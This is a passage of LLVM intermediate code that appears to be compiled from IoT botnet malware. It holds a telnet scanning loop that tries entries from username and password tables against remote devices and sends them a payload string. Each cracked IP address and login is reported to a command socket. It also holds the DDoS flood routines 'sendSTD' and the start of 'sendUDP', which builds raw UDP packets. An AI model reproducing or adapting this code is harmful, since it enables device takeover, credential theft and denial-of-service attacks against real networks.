  br label %2270

1935:                                             ; preds = %69
  %1936 = load i32, i32* %2, align 4
  %1937 = sext i32 %1936 to i64
  %1938 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1937
  %1939 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1938, i32 0, i32 0
  %1940 = load i32, i32* %1939, align 16
  %1941 = call i64 @send(i32 %1940, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.80, i64 0, i64 0), i64 9, i32 16384)
  %1942 = icmp slt i64 %1941, 0
  br i1 %1942, label %1943, label %1958

1943:                                             ; preds = %1935
  %1944 = load i32, i32* %2, align 4
  %1945 = sext i32 %1944 to i64
  %1946 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1945
  %1947 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1946, i32 0, i32 0
  %1948 = load i32, i32* %1947, align 16
  %1949 = call i32 @sclose(i32 %1948)
  %1950 = load i32, i32* %2, align 4
  %1951 = sext i32 %1950 to i64
  %1952 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1951
  %1953 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1952, i32 0, i32 2
  store i8 0, i8* %1953, align 8
  %1954 = load i32, i32* %2, align 4
  %1955 = sext i32 %1954 to i64
  %1956 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1955
  %1957 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1956, i32 0, i32 3
  store i8 1, i8* %1957, align 1
  br label %2271

1958:                                             ; preds = %1935
  %1959 = load i32, i32* %2, align 4
  %1960 = sext i32 %1959 to i64
  %1961 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1960
  %1962 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1961, i32 0, i32 2
  store i8 9, i8* %1962, align 8
  br label %2270

1963:                                             ; preds = %69
  %1964 = load i32, i32* %2, align 4
  %1965 = sext i32 %1964 to i64
  %1966 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1965
  %1967 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1966, i32 0, i32 0
  %1968 = load i32, i32* %1967, align 16
  %1969 = call i64 @send(i32 %1968, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384)
  %1970 = icmp slt i64 %1969, 0
  br i1 %1970, label %1971, label %1986

1971:                                             ; preds = %1963
  %1972 = load i32, i32* %2, align 4
  %1973 = sext i32 %1972 to i64
  %1974 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1973
  %1975 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1974, i32 0, i32 0
  %1976 = load i32, i32* %1975, align 16
  %1977 = call i32 @sclose(i32 %1976)
  %1978 = load i32, i32* %2, align 4
  %1979 = sext i32 %1978 to i64
  %1980 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1979
  %1981 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1980, i32 0, i32 2
  store i8 0, i8* %1981, align 8
  %1982 = load i32, i32* %2, align 4
  %1983 = sext i32 %1982 to i64
  %1984 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1983
  %1985 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1984, i32 0, i32 3
  store i8 1, i8* %1985, align 1
  br label %2271

1986:                                             ; preds = %1963
  %1987 = load i32, i32* @mainCommSock, align 4
  %1988 = load i32, i32* %2, align 4
  %1989 = sext i32 %1988 to i64
  %1990 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1989
  %1991 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1990, i32 0, i32 1
  %1992 = bitcast i32* %1991 to %struct.in_addr*
  %1993 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1992, i32 0, i32 0
  %1994 = load i32, i32* %1993, align 4
  %1995 = call i8* @inet_ntoa(i32 %1994) #12
  %1996 = load i32, i32* %2, align 4
  %1997 = sext i32 %1996 to i64
  %1998 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1997
  %1999 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1998, i32 0, i32 4
  %2000 = load i8, i8* %1999, align 2
  %2001 = zext i8 %2000 to i64
  %2002 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2001
  %2003 = load i8*, i8** %2002, align 8
  %2004 = load i32, i32* %2, align 4
  %2005 = sext i32 %2004 to i64
  %2006 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2005
  %2007 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2006, i32 0, i32 5
  %2008 = load i8, i8* %2007, align 1
  %2009 = zext i8 %2008 to i64
  %2010 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2009
  %2011 = load i8*, i8** %2010, align 8
  %2012 = call i32 (i32, i8*, ...) @sockprintf(i32 %1987, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %1995, i8* %2003, i8* %2011)
  %2013 = load i32, i32* %2, align 4
  %2014 = sext i32 %2013 to i64
  %2015 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2014
  %2016 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2015, i32 0, i32 2
  store i8 10, i8* %2016, align 8
  br label %2270

2017:                                             ; preds = %69
  %2018 = load i32, i32* %2, align 4
  %2019 = sext i32 %2018 to i64
  %2020 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2019
  %2021 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2020, i32 0, i32 6
  %2022 = load i32, i32* %2021, align 4
  %2023 = icmp eq i32 %2022, 0
  br i1 %2023, label %2024, label %2031

2024:                                             ; preds = %2017
  %2025 = call i64 @time(i64* null) #12
  %2026 = trunc i64 %2025 to i32
  %2027 = load i32, i32* %2, align 4
  %2028 = sext i32 %2027 to i64
  %2029 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2028
  %2030 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2029, i32 0, i32 6
  store i32 %2026, i32* %2030, align 4
  br label %2031

2031:                                             ; preds = %2024, %2017
  %2032 = load i32, i32* %2, align 4
  %2033 = sext i32 %2032 to i64
  %2034 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2033
  %2035 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2034, i32 0, i32 0
  %2036 = load i32, i32* %2035, align 16
  %2037 = load i32, i32* %2, align 4
  %2038 = sext i32 %2037 to i64
  %2039 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2038
  %2040 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2039, i32 0, i32 8
  %2041 = load i8*, i8** %2040, align 8
  %2042 = load i32, i32* %2, align 4
  %2043 = sext i32 %2042 to i64
  %2044 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2043
  %2045 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2044, i32 0, i32 7
  %2046 = load i16, i16* %2045, align 16
  %2047 = zext i16 %2046 to i32
  %2048 = call i32 @readUntil(i32 %2036, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.77, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %2041, i32 1024, i32 %2047)
  %2049 = icmp ne i32 %2048, 0
  br i1 %2049, label %2050, label %2091

2050:                                             ; preds = %2031
  %2051 = load i32, i32* %2, align 4
  %2052 = sext i32 %2051 to i64
  %2053 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2052
  %2054 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2053, i32 0, i32 6
  store i32 0, i32* %2054, align 4
  %2055 = load i32, i32* %2, align 4
  %2056 = sext i32 %2055 to i64
  %2057 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2056
  %2058 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2057, i32 0, i32 7
  store i16 0, i16* %2058, align 16
  %2059 = load i32, i32* %2, align 4
  %2060 = sext i32 %2059 to i64
  %2061 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2060
  %2062 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2061, i32 0, i32 0
  %2063 = load i32, i32* %2062, align 16
  %2064 = call i64 @send(i32 %2063, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384)
  %2065 = load i32, i32* @mainCommSock, align 4
  %2066 = load i32, i32* %2, align 4
  %2067 = sext i32 %2066 to i64
  %2068 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2067
  %2069 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2068, i32 0, i32 1
  %2070 = bitcast i32* %2069 to %struct.in_addr*
  %2071 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2070, i32 0, i32 0
  %2072 = load i32, i32* %2071, align 4
  %2073 = call i8* @inet_ntoa(i32 %2072) #12
  %2074 = load i32, i32* %2, align 4
  %2075 = sext i32 %2074 to i64
  %2076 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2075
  %2077 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2076, i32 0, i32 4
  %2078 = load i8, i8* %2077, align 2
  %2079 = zext i8 %2078 to i64
  %2080 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2079
  %2081 = load i8*, i8** %2080, align 8
  %2082 = load i32, i32* %2, align 4
  %2083 = sext i32 %2082 to i64
  %2084 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2083
  %2085 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2084, i32 0, i32 5
  %2086 = load i8, i8* %2085, align 1
  %2087 = zext i8 %2086 to i64
  %2088 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2087
  %2089 = load i8*, i8** %2088, align 8
  %2090 = call i32 (i32, i8*, ...) @sockprintf(i32 %2065, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %2073, i8* %2081, i8* %2089)
  br label %2271

2091:                                             ; preds = %2031
  %2092 = load i32, i32* %2, align 4
  %2093 = sext i32 %2092 to i64
  %2094 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2093
  %2095 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2094, i32 0, i32 0
  %2096 = load i32, i32* %2095, align 16
  %2097 = load i32, i32* %2, align 4
  %2098 = sext i32 %2097 to i64
  %2099 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2098
  %2100 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2099, i32 0, i32 8
  %2101 = load i8*, i8** %2100, align 8
  %2102 = load i32, i32* %2, align 4
  %2103 = sext i32 %2102 to i64
  %2104 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2103
  %2105 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2104, i32 0, i32 7
  %2106 = load i16, i16* %2105, align 16
  %2107 = zext i16 %2106 to i32
  %2108 = call i32 @readUntil(i32 %2096, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %2101, i32 1024, i32 %2107)
  %2109 = icmp ne i32 %2108, 0
  br i1 %2109, label %2110, label %2151

2110:                                             ; preds = %2091
  %2111 = load i32, i32* %2, align 4
  %2112 = sext i32 %2111 to i64
  %2113 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2112
  %2114 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2113, i32 0, i32 6
  store i32 0, i32* %2114, align 4
  %2115 = load i32, i32* %2, align 4
  %2116 = sext i32 %2115 to i64
  %2117 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2116
  %2118 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2117, i32 0, i32 7
  store i16 0, i16* %2118, align 16
  %2119 = load i32, i32* %2, align 4
  %2120 = sext i32 %2119 to i64
  %2121 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2120
  %2122 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2121, i32 0, i32 0
  %2123 = load i32, i32* %2122, align 16
  %2124 = call i64 @send(i32 %2123, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384)
  %2125 = load i32, i32* @mainCommSock, align 4
  %2126 = load i32, i32* %2, align 4
  %2127 = sext i32 %2126 to i64
  %2128 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2127
  %2129 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2128, i32 0, i32 1
  %2130 = bitcast i32* %2129 to %struct.in_addr*
  %2131 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2130, i32 0, i32 0
  %2132 = load i32, i32* %2131, align 4
  %2133 = call i8* @inet_ntoa(i32 %2132) #12
  %2134 = load i32, i32* %2, align 4
  %2135 = sext i32 %2134 to i64
  %2136 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2135
  %2137 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2136, i32 0, i32 4
  %2138 = load i8, i8* %2137, align 2
  %2139 = zext i8 %2138 to i64
  %2140 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2139
  %2141 = load i8*, i8** %2140, align 8
  %2142 = load i32, i32* %2, align 4
  %2143 = sext i32 %2142 to i64
  %2144 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2143
  %2145 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2144, i32 0, i32 5
  %2146 = load i8, i8* %2145, align 1
  %2147 = zext i8 %2146 to i64
  %2148 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2147
  %2149 = load i8*, i8** %2148, align 8
  %2150 = call i32 (i32, i8*, ...) @sockprintf(i32 %2125, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %2133, i8* %2141, i8* %2149)
  br label %2271

2151:                                             ; preds = %2091
  %2152 = load i32, i32* %2, align 4
  %2153 = sext i32 %2152 to i64
  %2154 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2153
  %2155 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2154, i32 0, i32 0
  %2156 = load i32, i32* %2155, align 16
  %2157 = load i32, i32* %2, align 4
  %2158 = sext i32 %2157 to i64
  %2159 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2158
  %2160 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2159, i32 0, i32 8
  %2161 = load i8*, i8** %2160, align 8
  %2162 = load i32, i32* %2, align 4
  %2163 = sext i32 %2162 to i64
  %2164 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2163
  %2165 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2164, i32 0, i32 7
  %2166 = load i16, i16* %2165, align 16
  %2167 = zext i16 %2166 to i32
  %2168 = call i32 @readUntil(i32 %2156, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i64 0, i64 0), i32 0, i32 0, i32 10000, i8* %2161, i32 1024, i32 %2167)
  %2169 = icmp ne i32 %2168, 0
  br i1 %2169, label %2170, label %2230

2170:                                             ; preds = %2151
  %2171 = load i32, i32* %2, align 4
  %2172 = sext i32 %2171 to i64
  %2173 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2172
  %2174 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2173, i32 0, i32 6
  store i32 0, i32* %2174, align 4
  %2175 = load i32, i32* %2, align 4
  %2176 = sext i32 %2175 to i64
  %2177 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2176
  %2178 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2177, i32 0, i32 7
  store i16 0, i16* %2178, align 16
  %2179 = load i32, i32* %2, align 4
  %2180 = sext i32 %2179 to i64
  %2181 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2180
  %2182 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2181, i32 0, i32 0
  %2183 = load i32, i32* %2182, align 16
  %2184 = call i64 @send(i32 %2183, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i64 0, i64 0), i64 394, i32 16384)
  %2185 = load i32, i32* @mainCommSock, align 4
  %2186 = load i32, i32* %2, align 4
  %2187 = sext i32 %2186 to i64
  %2188 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2187
  %2189 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2188, i32 0, i32 1
  %2190 = bitcast i32* %2189 to %struct.in_addr*
  %2191 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2190, i32 0, i32 0
  %2192 = load i32, i32* %2191, align 4
  %2193 = call i8* @inet_ntoa(i32 %2192) #12
  %2194 = load i32, i32* %2, align 4
  %2195 = sext i32 %2194 to i64
  %2196 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2195
  %2197 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2196, i32 0, i32 4
  %2198 = load i8, i8* %2197, align 2
  %2199 = zext i8 %2198 to i64
  %2200 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2199
  %2201 = load i8*, i8** %2200, align 8
  %2202 = load i32, i32* %2, align 4
  %2203 = sext i32 %2202 to i64
  %2204 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2203
  %2205 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2204, i32 0, i32 5
  %2206 = load i8, i8* %2205, align 1
  %2207 = zext i8 %2206 to i64
  %2208 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2207
  %2209 = load i8*, i8** %2208, align 8
  %2210 = call i32 (i32, i8*, ...) @sockprintf(i32 %2185, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i64 0, i64 0), i8* %2193, i8* %2201, i8* %2209)
  %2211 = load i32, i32* %2, align 4
  %2212 = sext i32 %2211 to i64
  %2213 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2212
  %2214 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2213, i32 0, i32 8
  %2215 = load i8*, i8** %2214, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %2215, i8 0, i64 1024, i1 false)
  %2216 = load i32, i32* %2, align 4
  %2217 = sext i32 %2216 to i64
  %2218 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2217
  %2219 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2218, i32 0, i32 0
  %2220 = load i32, i32* %2219, align 16
  %2221 = call i32 @sclose(i32 %2220)
  %2222 = load i32, i32* %2, align 4
  %2223 = sext i32 %2222 to i64
  %2224 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2223
  %2225 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2224, i32 0, i32 3
  store i8 1, i8* %2225, align 1
  %2226 = load i32, i32* %2, align 4
  %2227 = sext i32 %2226 to i64
  %2228 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2227
  %2229 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2228, i32 0, i32 2
  store i8 0, i8* %2229, align 8
  br label %2271

2230:                                             ; preds = %2151
  %2231 = load i32, i32* %2, align 4
  %2232 = sext i32 %2231 to i64
  %2233 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2232
  %2234 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2233, i32 0, i32 8
  %2235 = load i8*, i8** %2234, align 8
  %2236 = call i64 @strlen(i8* %2235) #11
  %2237 = trunc i64 %2236 to i16
  %2238 = load i32, i32* %2, align 4
  %2239 = sext i32 %2238 to i64
  %2240 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2239
  %2241 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2240, i32 0, i32 7
  store i16 %2237, i16* %2241, align 16
  br label %2242

2242:                                             ; preds = %2230
  br label %2243

2243:                                             ; preds = %2242
  br label %2244

2244:                                             ; preds = %2243
  %2245 = load i32, i32* %2, align 4
  %2246 = sext i32 %2245 to i64
  %2247 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2246
  %2248 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2247, i32 0, i32 6
  %2249 = load i32, i32* %2248, align 4
  %2250 = add i32 %2249, 10
  %2251 = zext i32 %2250 to i64
  %2252 = call i64 @time(i64* null) #12
  %2253 = icmp slt i64 %2251, %2252
  br i1 %2253, label %2254, label %2269

2254:                                             ; preds = %2244
  %2255 = load i32, i32* %2, align 4
  %2256 = sext i32 %2255 to i64
  %2257 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2256
  %2258 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2257, i32 0, i32 0
  %2259 = load i32, i32* %2258, align 16
  %2260 = call i32 @sclose(i32 %2259)
  %2261 = load i32, i32* %2, align 4
  %2262 = sext i32 %2261 to i64
  %2263 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2262
  %2264 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2263, i32 0, i32 2
  store i8 0, i8* %2264, align 8
  %2265 = load i32, i32* %2, align 4
  %2266 = sext i32 %2265 to i64
  %2267 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %2266
  %2268 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %2267, i32 0, i32 3
  store i8 1, i8* %2268, align 1
  br label %2269

2269:                                             ; preds = %2254, %2244
  br label %2270

2270:                                             ; preds = %69, %2269, %1986, %1958, %1930, %1906, %1200, %1136, %771, %707, %396, %232
  br label %2271

2271:                                             ; preds = %2270, %2170, %2110, %2050, %1971, %1943, %1915, %1863, %1838, %1797, %1772, %1731, %1706, %1665, %1640, %1599, %1574, %1533, %1508, %1467, %1442, %1401, %1376, %1348, %1307, %1282, %1254, %1185, %1162, %1084, %1061, %1038, %1015, %992, %969, %946, %923, %900, %886, %835, %756, %733, %661, %610, %559, %508, %457, %320, %185, %141
  %2272 = load i32, i32* %2, align 4
  %2273 = add nsw i32 %2272, 1
  store i32 %2273, i32* %2, align 4
  br label %65, !llvm.loop !42

2274:                                             ; preds = %65
  br label %63
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendSTD(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #12
  store i32 %12, i32* %7, align 4
  %13 = call i64 @time(i64* null) #12
  store i64 %13, i64* %8, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = call %struct.hostent* @gethostbyname(i8* %14)
  store %struct.hostent* %15, %struct.hostent** %10, align 8
  %16 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %16, i8 0, i64 16, i1 false)
  %17 = load %struct.hostent*, %struct.hostent** %10, align 8
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %17, i32 0, i32 4
  %19 = load i8**, i8*** %18, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %23 = bitcast %struct.in_addr* %22 to i8*
  %24 = load %struct.hostent*, %struct.hostent** %10, align 8
  %25 = getelementptr inbounds %struct.hostent, %struct.hostent* %24, i32 0, i32 3
  %26 = load i32, i32* %25, align 4
  %27 = sext i32 %26 to i64
  call void @bcopy(i8* %21, i8* %23, i64 %27) #12
  %28 = load %struct.hostent*, %struct.hostent** %10, align 8
  %29 = getelementptr inbounds %struct.hostent, %struct.hostent* %28, i32 0, i32 2
  %30 = load i32, i32* %29, align 8
  %31 = trunc i32 %30 to i16
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %31, i16* %32, align 4
  %33 = load i32, i32* %5, align 4
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  store i32 0, i32* %11, align 4
  br label %36

36:                                               ; preds = %3, %55
  %37 = load i32, i32* %11, align 4
  %38 = icmp uge i32 %37, 50
  br i1 %38, label %39, label %55

39:                                               ; preds = %36
  %40 = load i32, i32* %7, align 4
  %41 = call i64 @send(i32 %40, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.81, i64 0, i64 0), i64 50, i32 0)
  %42 = load i32, i32* %7, align 4
  %43 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %44 = call i32 @connect(i32 %42, %struct.sockaddr* %43, i32 16)
  %45 = call i64 @time(i64* null) #12
  %46 = load i64, i64* %8, align 8
  %47 = load i32, i32* %6, align 4
  %48 = sext i32 %47 to i64
  %49 = add nsw i64 %46, %48
  %50 = icmp sge i64 %45, %49
  br i1 %50, label %51, label %54

51:                                               ; preds = %39
  %52 = load i32, i32* %7, align 4
  %53 = call i32 @close(i32 %52)
  call void @_exit(i32 0) #14
  unreachable

54:                                               ; preds = %39
  store i32 0, i32* %11, align 4
  br label %55

55:                                               ; preds = %54, %36
  %56 = load i32, i32* %11, align 4
  %57 = add i32 %56, 1
  store i32 %57, i32* %11, align 4
  br label %36
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @sendUDP(i8* %0, i32 %1, i32 %2, i32 %3, i32 %4, i32 %5) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i64, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = load i32, i32* %8, align 4
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %36

32:                                               ; preds = %6
  %33 = call i32 @rand_cmwc()
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %41

36:                                               ; preds = %6
  %37 = load i32, i32* %8, align 4
  %38 = trunc i32 %37 to i16
  %39 = call zeroext i16 @htons(i16 zeroext %38) #15
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  br label %41

41:                                               ; preds = %36, %32
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %44 = call i32 @getHost(i8* %42, %struct.in_addr* %43)
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %46, label %47

46:                                               ; preds = %41
  br label %278

47:                                               ; preds = %41
